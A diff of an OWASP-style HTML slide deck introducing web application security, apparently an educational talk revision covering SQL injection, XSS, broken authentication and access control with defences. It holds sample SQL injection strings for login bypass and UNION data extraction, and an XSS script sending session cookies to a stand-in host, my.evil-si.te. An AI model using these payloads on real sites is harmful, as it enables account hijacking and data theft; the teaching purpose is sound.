@@ -6,7 +6,7 @@
 
 		<title>Web Application Security in a nutshell</title>
 
-		<meta name="description" content="An ultra-compact intro (or refresher) to Web Application Security">
+		<meta name="description" content="An ultra-compact intro to Web Application Security">
 		<meta name="author" content="Bjoern Kimminich">
 
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -44,91 +44,120 @@
 			<!-- Any section element inside of this container is displayed as a slide -->
 			<div class="slides">
                 <section>
-                    <section>
-                        <h1>Web Application Security</h1>
-                        <h3>in a nutshell</h3>
-                        <h5>An ultra-compact intro (or refresher)</h5>
-                        <p>
-                            <small>Created by <a href="http://kimminich.de">Björn Kimminich</a> / <a href="http://twitter.com/bkimminich">@bkimminich</a></small>
-                        </p>
-                    </section>
-                    <section>
-                        <h2>Björn Kimminich</h2>
-                        <ul>
-                            <li>IT Architect / AppSec Officer at <a href="http://kuehne-nagel.com">Kuehne + Nagel</a></li>
-                            <li>Volunteer in the <a href="https://owasp.org">Open Web Application Security Project</a></li>
-                            <li>Board Member of the <a href="https://www.owasp.org/index.php/Germany">German OWASP Chapter</a></li>
-                            <li>Project Lead of the <a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP Juice Shop</a></li>
-                        </ul>
-                    </section>
+                    <h2>Web Application Security</h2>
+                    <h3>in a 🌰shell</h3>
+                    <h5>An ultra-compact intro</h5>
+                    <p>
+                        <small>Created by <a href="https://www.linkedin.com/in/bkimminich/">Björn Kimminich</a> / <a href="http://twitter.com/bkimminich">@bkimminich</a></small>
+                    </p>
+                </section>
+                <section>
+                    <h2>Björn Kimminich</h2>
+                    <ul>
+                        <li>IT Architect / AppSec Officer at <a href="http://kuehne-nagel.com">Kuehne + Nagel</a></li>
+                        <li>Volunteer in the <a href="https://owasp.org">Open Web Application Security Project</a></li>
+                        <li>Board Member of the <a href="https://www.owasp.org/index.php/Germany">German OWASP Chapter</a></li>
+                        <li>Project Lead of the <a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP Juice Shop</a></li>
+                    </ul>
                 </section>
 
 				<section>
-                    <h2>Famous last words...</h2>
-                    <blockquote>
+                    <h2>🤐 Famous last words...</h2>
+                    <blockquote class="fragment">
                         &ldquo;Nobody would bother to hack us.&rdquo;
                     </blockquote>
-                    <blockquote>
-                        &ldquo;Our Firewall, IDS and IPS will keep us safe.&rdquo;
+                    <blockquote class="fragment">
+                        &ldquo;Our network firewall will keep us safe.&rdquo;
                     </blockquote>
-                    <blockquote>
+                    <blockquote class="fragment">
+                        &ldquo;We have tests for all our use cases.&rdquo;
+                    </blockquote>
+                    <blockquote class="fragment">
                         &ldquo;We will add security to the system later.&rdquo;
                     </blockquote>
-                    <blockquote>
-                        &ldquo;What's the worst that could actually happen?&rdquo;
+                    <blockquote class="fragment">
+                        &ldquo;What's the worst that could happen?&rdquo;
                     </blockquote>
                 </section>
 
                 <section>
-                    <h1>Let's go shopping!</h1>
+                    <h2>🤔 What is a Vulnerability?</h2>
+                    <blockquote class="fragment" cite="https://en.wikipedia.org/wiki/Vulnerability_(computing)#Definitions">
+                        A flaw or weakness in system security procedures, design, implementation, or internal controls that could […]
+                        result in a security breach or a violation of the system's security policy.
+                    </blockquote>
                 </section>
 
                 <section>
-                    <section>
-                        <h2>Injection</h2>
-                    </section>
-                    <section>
-                        <h3>Injection means...</h3>
-                        <p>
-                            ...tricking an application into including unintended commands in the data sent to an interpreter.
-                        </p>
-                    </section>
-                    <section>
-                        <h3>Interpreter means...</h3>
-                        <p>
-                            ...a program that takes a <code data-trim contenteditable>String</code> and interprets it as a command.
-                        </p>
-                    </section>
-                    <section>
-                        <h3>Interpreters are used for...</h3>
-                        <ul>
-                            <li>SQL</li>
-                            <li>HQL</li>
-                            <li>OS Shell</li>
-                            <li>LDAP</li>
-                            <li>XPath</li>
-                            <li>...</li>
-                        </ul>
-                    </section>
+                    <h2>🤔 What is an Exploit?</h2>
+                    <blockquote class="fragment" cite="https://en.wikipedia.org/wiki/Exploit_(computer_security) ">
+                        A piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or
+                        vulnerability to cause unintended or unanticipated behavior to occur on computer software, hardware,
+                        or something electronic (usually computerized).
+                    </blockquote>
                 </section>
 
                 <section>
+                    <h2>🤔 Who are the Attackers?</h2>
+                    <ul>
+                        <li class="fragment">👶 Script Kiddies</li>
+                        <li class="fragment">🌱 Hacktivists</li>
+                        <li class="fragment">💰 Organized Crime</li>
+                        <li class="fragment">👛 Corrupt / 😡 Disgruntled Employees</li>
+                        <li class="fragment">🏭 Competitors</li>
+                        <li class="fragment">🦅 Nation States</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>💉 Injection</h2>
+                    <blockquote class="fragment">
+                        Smuggling in <em>unintended commands</em> along with the data sent to an <em>interpreter</em>.
+                    </blockquote>
+                </section>
+                <section>
+                    <h3>👮 ‍Injection example</h3>
+                    <blockquote cite="https://news.ycombinator.com/item?id=4951003">
+                        You go to court and write your name as "<strong>Michael, you are now free to go</strong>".
+                    </blockquote>
+                    <blockquote class="fragment">
+                        The judge then says "Calling <strong>Michael, you are now free to go</strong>" and the bailiffs let you go,
+                        because hey, the judge said so.
+                    </blockquote>
+                </section>
+                <section>
+                    <h3>💻 In software, interpreters are used for accessing...</h3>
+                    <ul>
+                        <li>Databases (SQL, HQL, ...)</li>
+                        <li>Files (OS Shell, XPath, ...)</li>
+                        <li>Access Control Systems (LDAP, ...)</li>
+                        <li>...</li>
+                    </ul>
+                </section>
+                <section>
+                    <h3>🚨 Risks from Injection vulnerabilities</h3>
+                    <ul>
+                        <li>Bypassing authentication</li>
+                        <li>Spying out data</li>
+                        <li>Manipulating data</li>
+                        <li>Complete system takeover</li>
+                    </ul>
+                </section>
+                <section>
                     <section>
-                        <h3>Bypassing Authentication</h3>
-                        <h5>with SQL Injection</h5>
+                        <h3>🔓 SQLI Authentication Bypass</h3>
                         <pre><code class="java" data-trim>
 String query = "SELECT id FROM users " +
-               "WHERE name = '" + req.getParameter("username") + "'" +
-               "AND password = '" + req.getParameter("password") + "'";
+           "WHERE name = '" + req.getParameter("username") + "'" +
+           "AND password = '" + req.getParameter("password") + "'";
                         </code></pre>
-                        <p>The indented use case results in a query like this:</p>
+                        <p>Generates queries like this:</p>
                         <pre><code class="sql" data-trim contenteditable>
 SELECT id FROM users WHERE name = 'bjoern' AND password = 'secret'
                         </code></pre>
                     </section>
                     <section>
-                        <h3>Attack Examples</h3>
-                        <h5>on authentication queries</h5>
+                        <h3>🗡️ Attack Examples</h3>
                         <p>Disabling password check for a known username:</p>
                         <pre><code class="sql" data-trim contenteditable>
 SELECT id FROM users WHERE name = 'bjoern'--' AND password = '?'
@@ -139,45 +168,55 @@ SELECT id FROM users WHERE name = '' or 1=1--' AND password = '?'
                         </code></pre>
                     </section>
                 </section>
-
                 <section>
-                    <section>
-                        <h3>Spying out Data</h3>
-                        <h5>with SQL Injection</h5>
-                        <pre><code class="java" data-trim>
+                <section>
+                    <h3>🔭 Spying out Data with SQLI</h3>
+                    <pre><code class="java" data-trim>
 String query =
-            "SELECT id,author,title,price FROM books " +
-            "WHERE title LIKE '%" + req.getParameter("query") + "%'";
-                        </code></pre>
-                        <p>The indented use case results in a query like this:</p>
-                        <pre><code class="sql" data-trim contenteditable>
-SELECT id,author,title,price FROM books WHERE title LIKE '%tangled web%'
-                        </code></pre>
-                    </section>
+        "SELECT * FROM books " +
+        "WHERE title LIKE '%" + req.getParameter("query") + "%'";
+                    </code></pre>
+                    <p>Generates queries like this:</p>
+                    <pre><code class="sql" data-trim contenteditable>
+SELECT * FROM books WHERE title LIKE '%tangled web%'
+                    </code></pre>
+                </section>
                     <section>
-                        <h3>Attack Examples</h3>
-                        <h5>on data retrieval queries</h5>
-                        <p>Probing for right number of result set columns:</p>
+                        <h3>🗡️ Attack Examples</h3>
+                        <small>❌ This will <strong>not</strong> work unless both result sets coincidentally have equal number of columns:</small>
                         <pre><code class="sql" data-trim>
-SELECT [...] WHERE title LIKE '%' UNION SELECT null FROM users--%'
+SELECT * FROM books WHERE title LIKE '%' UNION SELECT * FROM users--%'
                         </code></pre>
-                        <pre class="fragment"><code class="sql" data-trim>
-SELECT [...] WHERE title LIKE '%' UNION SELECT null,null FROM users--%'
+                        <p>
+                            <span class="fragment" data-fragment-index="1">❌</span>
+                            <span class="fragment" data-fragment-index="2">❌</span>
+                            <span class="fragment" data-fragment-index="3">✅</span>
+                            <span class="fragment" data-fragment-index="1">Probing for right number of result set columns:</span>
+                        </p>
+                        <pre class="fragment" data-fragment-index="1"><code class="sql" data-trim>
+SELECT * FROM books WHERE title LIKE '%' UNION SELECT 1 FROM users--%'
                         </code></pre>
-                        <pre class="fragment"><code class="sql" data-trim>
-SELECT [...] WHERE title LIKE '%' UNION SELECT null,null,null FROM users--%'
+                        <pre class="fragment" data-fragment-index="2"><code class="sql" data-trim>
+SELECT * FROM books WHERE title LIKE '%' UNION SELECT 1,2 FROM users--%'
+                        </code></pre>
+                        <pre class="fragment" data-fragment-index="3"><code class="sql" data-trim>
+SELECT * FROM books WHERE title LIKE '%'
+UNION SELECT 1,2,3 FROM users--%'
                         </code></pre>
                         <div class="fragment">
-                            <p>Using known column names to extract data:</p>
+                            <p>Using known/guessed column names to extract data:</p>
                             <pre><code class="sql" data-trim>
-SELECT [...] WHERE title LIKE '%' UNION SELECT name,password,email FROM users--%'
+SELECT * FROM books WHERE title LIKE '%'
+UNION SELECT name,email,password FROM users--%'
                             </code></pre>
                         </div>
                     </section>
                 </section>
-
                 <section>
-                    <h3>Preventing Injection</h3>
+                    <h1>🎦 Demo</h1>
+                </section>
+                <section>
+                    <h3>🛡️ Protection against Injection</h3>
                     <ul>
                         <li>Avoid Interpreters</li>
                         <li>Bind Variables</li>
@@ -188,72 +227,76 @@ SELECT [...] WHERE title LIKE '%' UNION SELECT name,password,email FROM users--%
                 </section>
 
                 <section>
-                    <section>
-                        <h2>Cross Site Scripting (XSS)</h2>
-                    </section>
-                    <section>
-                        <h3>Malicious Code is sent...</h3>
-                        <p>
-                            ...to an innocent user's browser through
-                        </p>
-                        <ul>
-                            <li>a form field or URL (Reflected XSS)</li>
-                            <li>a previously stored DB record (Persistent XSS)</li>
-                            <li>a DOM element of a rich JS client (Local XSS)</li>
-                        </ul>
-                    </section>
-                    <section>
-                        <h3>Possible Damage from XSS</h3>
-                        <ul>
-                            <li>stolen user session</li>
-                            <li>stolen sensitive data</li>
-                            <li>rewriting web page</li>
-                            <li>redirecting to malicious site</li>
-                        </ul>
-                    </section>
+                    <h2>📜 Cross Site Scripting (XSS)</h2>
                 </section>
-
                 <section>
-                    <section>
-                        <h3>XSS Vulnerability Example</h3>
-                        <pre><code class="command" data-trim contenteditable>
+                    <h3>💀 Malicious Code is sent...</h3>
+                    <small>
+                        ...to an innocent user's browser through, e.g. a link in a phishing email like the following:
+                    </small>
+                    <blockquote><small>
+                        Dear valued customer,
+                        <br><br>
+                        you might be intrerestred in our new special offer! We offer
+                        best quailty on the planet for the lowest price possible: <a target="_blank" href="http://localhost:3000/#/search?q=%3Chr%3E%3Ch1%3ESorry,%20we%20went%20out%20of%20business!%3C%2Fh1%3E%3Cimg%20src%3D%22http:%2F%2Fwebappsec-nutshell.kimminich.de%2Fassets%2Fumwelt-gift-warnung.png%22%3E%3Chr%3E~~~~~~~~~~Click%20%3Ca%20href%3D%22http:%2F%2Fwww.ebay.com%2Fsch%2Fi.html%3F_sacat%3D0%26_nkw%3Dkuehne%2Bnagel%26_frs%3D1%22%3E*****here*****%3C%2Fa%3E%20to%20buy%20quality%20wares%20instead!~~~~~~~~~~">Click here for special offer!</a>
+                        <br><br>
+                        Bjorn (Chief Executive Officer)
+                    </small></blockquote>
+                </section>
+                <section>
+                    <h3>🚒 Possible Damage from XSS</h3>
+                    <ul>
+                        <li>rewriting web page</li>
+                        <li>redirecting to malicious site</li>
+                        <li>stolen user session</li>
+                        <li>stolen sensitive data</li>
+                    </ul>
+                </section>
+                <section>
+                    <h3>📜 XSS Vulnerability Example</h3>
+                    <pre><code class="command" data-trim contenteditable>
 http://bookwo.rm/titles/search?keywords=raspberry%20pi
-                        </code></pre>
-                        <p>The indented use case is to display the keywords above the results:</p>
-                        <pre><code class="java" data-trim contenteditable>
+                    </code></pre>
+                    <p>Often the search terms are displayed above the results:</p>
+                    <pre><code class="java" data-trim contenteditable>
 <%
 String keywords = request.getParameter("keywords");
-List&lt;Book&gt; results = titleSearchService.findByKeywords(keywords.split(" "));
+List&lt;Book&gt; results = titleSearchService.search(keywords.split(" "));
 %>
-There are <%=results.count()%> results for your search by &lt;em&gt;<%=keywords%>&lt;/em&gt;
+There are <%=results.count()%> results for
+your search terms &lt;em&gt;<%=keywords%>&lt;/em&gt;
 &lt;table&gt;
-    <% for (Book book : results) { %>
-      // render result as table rows
-    <% } %>
+<% for (Book book : results) { %>
+  // render result as table rows
+<% } %>
 &lt;/table&gt;
-                        </code></pre>
-                    </section>
-                    <section>
-                        <h3>XSS Attack Examples</h3>
-                        <p>Probing for XSS Vulnerability</p>
-                        <pre><code class="command" data-trim contenteditable>
-&lt;script&gt;alert(1)&lt;/script&gt;
-                        </code></pre>
-                        <p>Stealing User Session</p>
-                        <pre><code class="command" data-trim contenteditable>
-&lt;script&gt;
-    new Image().src="http://my.evil-si.te/hijack.php?c="+encodeURI(document.cookie);
-&lt;/script&gt;
-                        </code></pre>
-                        <p>Site Defacement</p>
-                        <pre><code class="command" data-trim contenteditable>
-&lt;script&gt;document.body.background="http://my.evil-si.te/image.jpg";&lt;/script&gt;
-                        </code></pre>
-                    </section>
+                    </code></pre>
                 </section>
-
                 <section>
-                    <h3>Preventing XSS</h3>
+                    <h3>🗡️ Attack Examples</h3>
+                    <p>Probing for XSS Vulnerability</p>
+                    <pre><code class="command" data-trim contenteditable>
+&lt;script&gt;alert(1)&lt;/script&gt;
+                    </code></pre>
+                    <p>Stealing User Session</p>
+                    <pre><code class="command" data-trim contenteditable>
+&lt;script&gt;
+  new Image().src="http://my.evil-si.te/hijack.php?c="
+                        +encodeURI(document.cookie);
+&lt;/script&gt;
+                    </code></pre>
+                    <p>Site Defacement</p>
+                    <pre><code class="command" data-trim contenteditable>
+&lt;script&gt;
+  document.body.background="http://my.evil-si.te/image.jpg";
+&lt;/script&gt;
+                    </code></pre>
+                </section>
+                <section>
+                    <h1>🎦 Demo</h1>
+                </section>
+                <section>
+                    <h3>🛡️ Protection against XSS</h3>
                     <ul>
                         <li>Avoid including user supplied input into output</li>
                         <li>Output encode <strong>all</strong> user supplied input</li>
@@ -263,127 +306,31 @@ There are <%=results.count()%> results for your search by &lt;em&gt;<%=keywords%
                 </section>
 
                 <section>
-                    <section>
-                        <h2>Cross Site Request Forgery (CSRF)</h2>
-                    </section>
-                    <section>
-                        <h3>A Victim's Browser...</h3>
-                            <p>
-                                ...is tricked into issuing a command to a vulnerable webapp. This is caused by browsers automatically including user authentication data with each request.
-                            </p>
-                            <ul>
-                                <li>Session Cookie</li>
-                                <li>Basic Authentication</li>
-                                <li><code>Authorization</code> HTTP Header</li>
-                                <li>...</li>
-                            </ul>
-                    </section>
+                    <h2>🔑 Broken Authentication</h2>
                 </section>
-
                 <section>
-                    <h3>CSRF Attack Examples</h3>
-                    <img src="http://127.0.0.1/api/user/1/delete" width="200" height="300">
-                    <img src="http://router.box/admin/reset" width="200" height="300">
-                    <img src="http://myfor.um/logout.php" width="200" height="300">
-                </section>
-
-                <section>
-                    <h3>Preventing CSRF</h3>
+                    <h3>🤦‍ Typical Authentication Flaws</h3>
                     <ul>
-                        <li>Add a secret token to all sensitive requests</li>
-                        <li>This token must not be automatically submitted</li>
-                        <li>Require secondary authentication for sensitive functions</li>
-                        <li>Beware exposing the token in a <code>Referer</code> HTTP header</li>
+                        <li>Allowing weak passwords</li>
+                        <li>Storing sensitive data insecurely</li>
+                        <li>Using insecure <code>http</code> connection</li>
+                        <li>...</li>
                     </ul>
-                    <hr>
-                    <p>
-                        Make sure your application has no XSS holes that could be exploited to attack others!
-                    </p>
                 </section>
-
                 <section>
-                    <section>
-                        <h2>Broken Authentication</h2>
-                    </section>
-                    <section>
-                        <h3>Typical Authentication Flaws</h3>
-                        <ul>
-                            <li>Allowing weak passwords</li>
-                            <li>Storing SSL certificate insecurely</li>
-                            <li>Credentials passed via insecure <code>http</code> connection</li>
-                            <li>Expose session id's in URLs, via unsafe network, logs, ...</li>
-                        </ul>
-                    </section>
-                    <section>
-                        <h3>Side Channel Attack Vectors</h3>
-                        <ul>
-                            <li>Change Password</li>
-                            <li>&ldquo;Remember me&rdquo;</li>
-                            <li>Forgot Password</li>
-                            <li>Secret Questions</li>
-                        </ul>
-                    </section>
+                    <h3>🏹 Side Channel Attack Vectors</h3>
+                    <ul>
+                        <li>Change Password</li>
+                        <li>&ldquo;Remember me&rdquo;</li>
+                        <li>Forgot Password</li>
+                        <li>Secret Questions</li>
+                    </ul>
                 </section>
-
                 <section>
-                    <h3>Classical Broken Authentication...</h3>
-                    <h5>...due to starting login process on unencrypted page</h5>
-                    <pre><code data-trim contenteditable>
-http://sick-cure-ba.nk/login.do
-                    </code></pre>
-                    <pre><code class="command" data-trim>
-POST /login.do HTTP/1.1
-Host: sick-cure-ba.nk
-Cache-Control: no-cache
-Content-Type: application/x-www-form-urlencoded
-
-username=bjoern&password=secret
-                    </code></pre>
+                    <h1>🎦 Demo</h1>
                 </section>
-
                 <section>
-                    <h3>Weak hashes put passwords at risk...</h3>
-                    <h5>...as do unsalted strong hash algorithms</h5>
-                    <table>
-                        <thead>
-                        <tr>
-                            <th>id</th>
-                            <th>username</th>
-                            <th>password</th>
-                        </tr>
-                        </thead>
-                        <tbody>
-                        <tr>
-                            <td>1</td>
-                            <td>admin</td>
-                            <td><small>d033e22ae348aeb5660fc2140aec35850c4da997</small></td>
-                        <tr/>
-                        <tr>
-                            <td>2</td>
-                            <td>bjoern</td>
-                            <td><small>2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b</small></td>
-                        <tr/>
-                        <tr>
-                            <td>3</td>
-                            <td>localhorst</td>
-                            <td><small>
-                                0f59bd4122f0c02002ec578e4eec306ed48ff2ad0105a307a6dc98c0e9a54fe4
-                                64e5f807236edce12134067a0b6690891e82490b2b9fa7b4171db43ee8cb4006
-                            </small></td>
-                        <tr/>
-                        </tbody>
-                    </table>
-                    <hr>
-                    <p>
-                        <small>
-                            Cracking unsalted hashes with a <a href="http://en.wikipedia.org/wiki/Rainbow_table">Rainbow Table</a> attack is fast, even though the last two of them might seem sufficiently secure given their 256 and 512bit length.
-                            You can easily crack weak password hashes online, e.g. at <a href="https://crackstation.net/">CrackStation</a>.
-                        </small>
-                    </p>
-                </section>
-
-                <section>
-                    <h3>Securing Authentication</h3>
+                    <h3>🛡️ Securing Authentication</h3>
                     <ul>
                         <li>Centralized and standardize authentication</li>
                         <li>Protect credentials with SSL/TLS<small>1</small></li>
@@ -392,144 +339,72 @@ username=bjoern&password=secret
                     </ul>
                     <hr>
                     <p>
-                    <small>
-                        <small>1</small>Serve a <a href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS header</a> from your site to protect against protocol downgrade attacks. Also consider applying to have your domain included in the <a href="https://hstspreload.org">HSTS preload list</a> of Chromium.
-                    </small>
+                        <small>
+                            <small>1</small>Serve a <a href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS header</a> from your site to protect against protocol downgrade attacks. Also consider applying to have your domain included in the <a href="https://hstspreload.org">HSTS preload list</a> of Chromium.
+                        </small>
                     </p>
-                    <p>
-                    <small>
-                        <small>2</small> Use only brute-force resistant algorithms for password hashing, preferrably <a href="https://github.com/P-H-C/phc-winner-argon2">Argon2</a> the winner of
-                        the <a href="https://password-hashing.net/">Password Hashing Competition</a>.
-                    </small>
-                    </p>
-                </section>
-
-                <section>
-                    <section>
-                        <h2>Broken Access Control</h2>
-                    </section>
-                    <section>
-                        <h3>Common Authorization Mistakes</h3>
-                        <ul>
-                            <li>Hiding object references instead of restricting access</li>
-                            <li>Displaying only authorized links and menu choices</li>
-                            <li>Trusting client-side access control mechanisms</li>
-                            <li>Lack of server-side verification of user privileges</li>
-                        </ul>
-                    </section>
-                </section>
-
-                <section>
-                    <h3>Request Tampering for Privilege Escalation...</h3>
-                    <h5>...and finding all kinds of Access Control Issues</h5>
-                        <pre><code class="command" data-trim contenteditable>
-http://logistics-worldwi.de/showShipment?id=40643108
-                        </code></pre>
-                        <pre><code class="command" data-trim contenteditable>
-http://my-universi.ty/api/students/6503/exams/view
-                        </code></pre>
-                        <pre><code class="command" data-trim contenteditable>
-http://document-warehou.se/landingpage?content=index.html
-                        </code></pre>
-                    </section>
-
-                <section>
-                    <h3>Securing Access Control</h3>
-                    <ul>
-                        <li>Never rely on <q>&ldquo;Security by obscurity&rdquo;</q></li>
-                        <li>Replace direct object references with temporary mappings</li>
-                        <li>Restrict data and functionality access to authorized users</li>
-                        <li>Enforce user or role based permissions</li>
-                    </ul>
-                </section>
-
-                <section>
-                    <section>
-                        <h2>Broken Environment</h2>
-                    </section>
-                    <section>
-                        <h3>Possible Environmental Vulnerabilities</h3>
-                        <ul>
-                            <li>Software Libraries</li>
-                            <li>Application Server</li>
-                            <li>Web Server</li>
-                            <li>Operating System</li>
-                            <li>...</li>
-                        </ul>
-                    </section>
-                </section>
-
-                <section>
-                    <h3>Known Vulnerability Examples</h3>
-                    <table>
-                        <thead>
-                        <tr>
-                            <th>Component</th>
-                            <th>Vulnerability</th>
-                            <th>Affected</th>
-                        </tr>
-                        </thead>
-                        <tbody>
-                        <tr>
-                            <td>OpenSSL</td>
-                            <td><small>Obtain sensitive information from process memory via crafted packets that trigger a buffer over-read (<a href="http://heartbleed.com/">Heartbleed</a>)</small></td>
-                            <td><small>1.0.1 - 1.0.1f, 1.0.2-beta, 1.0.2-beta1</small></td>
-                        <tr/>
-                        <tr class="fragment">
-                            <td>Unix Bash</td>
-                            <td><small>Execution of arbitrary commands on vulnerable Bash, potentially compromising the entire system (<a href="http://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a>)</small></td>
-                            <td><small>CGI, OpenSSH, DHCP, QMail, ...</small></td>
-                        <tr/>
-                        <tr class="fragment">
-                            <td>Struts</td>
-                            <td><small>Remote manipulation of the <code>ClassLoader</code> via the <code>class</code> parameter, which is passed to the <code>getClass()</code> method</small></td>
-                            <td><small>before 2.3.16.1</small></td>
-                        <tr/>
-                        <tr class="fragment">
-                            <td>Struts</td>
-                            <td><small>Wildcard <code>cookiesName</code> not properly restricts access to the <code>getClass()</code> method, which allows <code>ClassLoader</code> manipulation</small></td>
-                            <td><small>before 2.3.16.2</small></td>
-                        <tr/>
-                        </tbody>
-                    </table>
-                </section>
-
-                <section>
-                    <h3>Protection from Environmental Vulnerabilities</h3>
-                    <ul>
-                        <li>Monitor security of used components</li>
-                        <li>Keep up with patches for used components</li>
-                        <li>Remove unnecessary stuff on all levels</li>
-                        <li>Restrict use of unapproved components</li>
-                    </ul>
-                    <hr>
                     <p>
                         <small>
-                            Java and .NET project dependencies can be monitored by <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check</a> which
-                            relies on the <a href="http://nvd.nist.gov/download.cfm">NIST National Vulnerability Database</a>. For Javascript and Node.js modules there is
-                            <a href="http://bekk.github.io/retire.js/">Retire.js</a> which is updated manually via <a href="https://github.com/bekk/retire.js">its GitHub project</a>.
-                            Both tools integrate well with typical software build processes.
+                            <small>2</small> Best avoid to store credentials at all. If you must, use only brute-force resistant algorithms for password hashing, preferrably <a href="https://github.com/P-H-C/phc-winner-argon2">Argon2</a> the winner of the <a href="https://password-hashing.net/">Password Hashing Competition</a>.
                         </small>
                     </p>
                 </section>
 
                 <section>
-                    <section>
-                        <h1>Q&A</h1>
-                    </section>
-                    <section>
-                        <h2>Credits</h2>
-                            <p>Presentation created with <a href="https://github.com/hakimel/reveal.js">reveal.js</a></p><small>The HTML Presentation Framework</small>
-                            <p>Based on free material provided by <a href="https://owasp.org">OWASP</a></p><small>The Open Web Application Security Project</small>
-                            <p>Background image based on <a href="http://sephiroth-kmfdm.deviantart.com/art/Digital-Shodan-56013493">Digital Shodan</a></p><small>by <a href="http://sephiroth-kmfdm.deviantart.com/">sephiroth-kmfdm</a></small>
-                    </section>
+                    <h2>🚪 Broken Access Control</h2>
+                </section>
+                <section>
+                    <h3>🔓 Common Authorization Mistakes</h3>
+                    <ul>
+                        <li>Hiding things w/o restricting access</li>
+                        <li>Displaying only authorized links and menu choices</li>
+                        <li>Trusting client-side access control mechanisms</li>
+                        <li>Lack of server-side verification of user privileges</li>
+                    </ul>
+                </section>
+                <section>
+                    <h3>🃏 Request Tampering Examples</h3>
+                    <p>How could we escalate our privileges here?</p>
+                    <pre><code class="command" data-trim contenteditable>
+http://logistics-worldwi.de/showShipment?id=40643108
+                        </code></pre>
+                    <pre><code class="command" data-trim contenteditable>
+http://my-universi.ty/api/students/6503/exams/view
+                        </code></pre>
+                    <pre><code class="command" data-trim contenteditable>
+http://document-warehou.se/landingpage?content=index.html
+                        </code></pre>
+                </section>
+                <section>
+                    <h1>🎦 Demo</h1>
+                </section>
+                <section>
+                    <h3>🛡️ Securing Access Control</h3>
+                    <ul>
+                        <li>Never rely on <q>&ldquo;Security by obscurity&rdquo;</q></li>
+                        <li>Restrict data and functionality access</li>
+                        <li>Enforce user or role based permissions</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h1>❓ Q&A</h1>
+                </section>
+                <section>
+                    <h2>Credits</h2>
+                        <p>Presentation created with <a href="https://github.com/hakimel/reveal.js">reveal.js</a></p><small>The HTML Presentation Framework</small>
+                        <p>Based on free material provided by <a href="https://owasp.org">OWASP</a></p><small>The Open Web Application Security Project</small>
+                        <p>Background image based on <a href="http://sephiroth-kmfdm.deviantart.com/art/Digital-Shodan-56013493">Digital Shodan</a></p><small>by <a href="http://sephiroth-kmfdm.deviantart.com/">sephiroth-kmfdm</a></small>
                 </section>
 
 				<section>
 					<h1>THE END</h1>
-					<h3>by Björn Kimminich / kimminich.de</h3>
+                    <p>Copyright (C) 2018 <a href="https://www.linkedin.com/in/bkimminich/">Björn Kimminich</a> / <a href="http://twitter.com/bkimminich">@bkimminich</a></p>
+                    <img src="assets/cc_by-nc-nd_4.0.png" class="no-box">
                     <p>
-                        These slides are publicly available on <a href="https://github.com/bkimminich/webappsec-nutshell">GitHub</a> and <a href="http://slideshare.net/BjrnKimminich/web-application-security-in-a-nutshell">Slideshare</a>.
+                        <small><small>
+                            This work is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>.
+                        </small></small>
                     </p>
 				</section>
 
@@ -572,9 +447,9 @@ http://document-warehou.se/landingpage?content=index.html
 
         <div class="hidden-mobile">
             <div style="display: block; position: absolute; bottom: 14px; left: 50%; margin-left: -230px; z-index: 20;">
-                <a href="https://twitter.com/bkimminich" class="twitter-follow-button" data-show-count="false">Follow @bkimminich</a>
+                <a href="https://twitter.com/share" class="twitter-share-button" data-url="http://webappsec-nutshell.kimminich.de" data-text="Web Application Security in a Nutshell - An ultra-compact intro" data-via="bkimminich">Tweet</a>
                 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
-                <a href="https://twitter.com/share" class="twitter-share-button" data-url="http://webappsec-nutshell.kimminich.de" data-text="Web Application Security in a Nutshell - An ultra-compact intro (or refresher)" data-via="bkimminich">Tweet</a>
+                <a href="https://twitter.com/bkimminich" class="twitter-follow-button" data-show-count="true">Follow @bkimminich</a>
                 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
                 <iframe src="https://ghbtns.com/github-btn.html?user=bkimminich&type=follow&count=true" frameborder="0" scrolling="0" width="180px" height="20px"></iframe>
                 <iframe src="https://ghbtns.com/github-btn.html?user=bkimminich&repo=webappsec-nutshell&type=star&count=true" frameborder="0" scrolling="0" width="170px" height="20px"></iframe>
